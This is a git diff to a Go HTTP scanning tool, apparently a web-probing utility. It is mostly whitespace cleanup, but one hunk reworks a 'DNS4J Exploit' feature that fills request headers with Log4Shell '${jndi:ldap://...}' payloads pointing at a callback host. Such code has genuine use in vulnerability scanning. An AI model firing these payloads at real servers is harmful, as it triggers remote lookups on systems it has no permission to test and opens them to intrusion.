@@ -157,9 +157,6 @@ func New(options *Options) (*Runner, error) {
 		options.rawRequest = string(rawRequest)
 	}
 
-
-
-
 	// disable automatic host header for rawhttp if manually specified
 	// as it can be malformed the best approach is to remove spaces and check for lowercase "host" word
 	if options.Unsafe {
@@ -575,7 +572,6 @@ func (r *Runner) RunEnumeration() {
 				continue
 			}
 
-
 			row := resp.str
 			if r.options.JSONOutput {
 				row = resp.JSON(&r.scanopts)
@@ -780,7 +776,6 @@ retry:
 		return Result{URL: domain, Input: origInput, err: err}
 	}
 
-
 	// check if we have to skip the host:port as a result of a previous failure
 	hostPort := net.JoinHostPort(URL.Host, URL.Port)
 	if r.options.HostMaxErrors >= 0 && r.HostErrorsCache.Has(hostPort) {
@@ -823,8 +818,6 @@ retry:
 
 	}
 
-
-
 	if err != nil {
 		return Result{URL: URL.String(), Input: origInput, err: err}
 	}
@@ -836,21 +829,29 @@ retry:
 	// DNS4J Exploit, maybee need more improvement
 	if hp.Options.DNS4J != "" {
 		head, err := os.Open("Log4Header.txt")
-		if err != nil{
+		if err != nil {
 			gologger.Fatal().Msgf("No input provided: %s", err)
 		}
 		defer head.Close()
-
 		scanner := bufio.NewScanner(head)
-		for scanner.Scan(){
-			hp.CustomHeaders[scanner.Text()] = fmt.Sprintf("${jndi:ldap://%s.%s/a}", URL.Host, hp.Options.DNS4J)
-		}
-		if err := scanner.Err(); err != nil{
-			log.Fatal(err)
+		if strings.Contains(hp.Options.DNS4J, "REPLACEME") {
+			for scanner.Scan() {
+				hp.CustomHeaders[scanner.Text()] = fmt.Sprintf("${jndi:ldap://%s/a}", strings.Replace(hp.Options.DNS4J, "REPLACEME", URL.Host, 1))
+			}
+			if err := scanner.Err(); err != nil {
+				log.Fatal(err)
+			}
+		} else {
+			for scanner.Scan() {
+				hp.CustomHeaders[scanner.Text()] = hp.Options.DNS4J
+			}
+			if err := scanner.Err(); err != nil {
+				log.Fatal(err)
+			}
+
 		}
 
 	}
-
 
 	hp.SetCustomHeaders(req, hp.CustomHeaders)
 	// We set content-length even if zero to allow net/http to follow 307/308 redirects (it fails on unknown size)
